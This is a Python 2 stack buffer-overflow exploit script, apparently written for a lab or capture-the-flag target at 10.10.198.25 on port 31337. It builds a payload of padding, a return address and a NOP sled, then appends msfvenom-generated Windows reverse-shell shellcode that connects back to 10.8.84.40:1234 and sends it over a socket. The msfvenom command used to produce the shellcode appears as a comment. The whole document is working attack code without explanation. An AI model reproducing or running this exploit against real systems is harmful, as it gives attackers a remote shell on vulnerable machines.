#!/usr/bin/python
import socket,sys
from time import sleep
ip="10.10.198.25"
port=31337

#msfvenom -p windows/shell_reverse_tcp lhost=10.8.84.40 lport=1234 -a x86 -f python -b "\x00\x0a"

buf =  b""
buf += b"\xd9\xc7\xd9\x74\x24\xf4\xb8\xb5\x49\xee\xc2\x5b\x33"
buf += b"\xc9\xb1\x52\x31\x43\x17\x83\xc3\x04\x03\xf6\x5a\x0c"
buf += b"\x37\x04\xb4\x52\xb8\xf4\x45\x33\x30\x11\x74\x73\x26"
buf += b"\x52\x27\x43\x2c\x36\xc4\x28\x60\xa2\x5f\x5c\xad\xc5"
buf += b"\xe8\xeb\x8b\xe8\xe9\x40\xef\x6b\x6a\x9b\x3c\x4b\x53"
buf += b"\x54\x31\x8a\x94\x89\xb8\xde\x4d\xc5\x6f\xce\xfa\x93"
buf += b"\xb3\x65\xb0\x32\xb4\x9a\x01\x34\x95\x0d\x19\x6f\x35"
buf += b"\xac\xce\x1b\x7c\xb6\x13\x21\x36\x4d\xe7\xdd\xc9\x87"
buf += b"\x39\x1d\x65\xe6\xf5\xec\x77\x2f\x31\x0f\x02\x59\x41"
buf += b"\xb2\x15\x9e\x3b\x68\x93\x04\x9b\xfb\x03\xe0\x1d\x2f"
buf += b"\xd5\x63\x11\x84\x91\x2b\x36\x1b\x75\x40\x42\x90\x78"
buf += b"\x86\xc2\xe2\x5e\x02\x8e\xb1\xff\x13\x6a\x17\xff\x43"
buf += b"\xd5\xc8\xa5\x08\xf8\x1d\xd4\x53\x95\xd2\xd5\x6b\x65"
buf += b"\x7d\x6d\x18\x57\x22\xc5\xb6\xdb\xab\xc3\x41\x1b\x86"
buf += b"\xb4\xdd\xe2\x29\xc5\xf4\x20\x7d\x95\x6e\x80\xfe\x7e"
buf += b"\x6e\x2d\x2b\xd0\x3e\x81\x84\x91\xee\x61\x75\x7a\xe4"
buf += b"\x6d\xaa\x9a\x07\xa4\xc3\x31\xf2\x2f\xe6\xcd\xa8\x87"
buf += b"\x9e\xcf\x50\xdc\x8c\x59\xb6\xb6\x20\x0c\x61\x2f\xd8"
buf += b"\x15\xf9\xce\x25\x80\x84\xd1\xae\x27\x79\x9f\x46\x4d"
buf += b"\x69\x48\xa7\x18\xd3\xdf\xb8\xb6\x7b\x83\x2b\x5d\x7b"
buf += b"\xca\x57\xca\x2c\x9b\xa6\x03\xb8\x31\x90\xbd\xde\xcb"
buf += b"\x44\x85\x5a\x10\xb5\x08\x63\xd5\x81\x2e\x73\x23\x09"
buf += b"\x6b\x27\xfb\x5c\x25\x91\xbd\x36\x87\x4b\x14\xe4\x41"
buf += b"\x1b\xe1\xc6\x51\x5d\xee\x02\x24\x81\x5f\xfb\x71\xbe"
buf += b"\x50\x6b\x76\xc7\x8c\x0b\x79\x12\x15\x3b\x30\x3e\x3c"
buf += b"\xd4\x9d\xab\x7c\xb9\x1d\x06\x42\xc4\x9d\xa2\x3b\x33"
buf += b"\xbd\xc7\x3e\x7f\x79\x34\x33\x10\xec\x3a\xe0\x11\x25"


bof = "A" * 146 + "\xc3\x14\x04\x08" + "\x90" * 10 + buf
try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,port))
    print "Fuzzing with "+str(len(bof))+" Characters"
    s.send(bof + '\r\n')
    s.recv(1024)
    s.close()
except:
    print "Some Error Occured"
    sys.exit(0)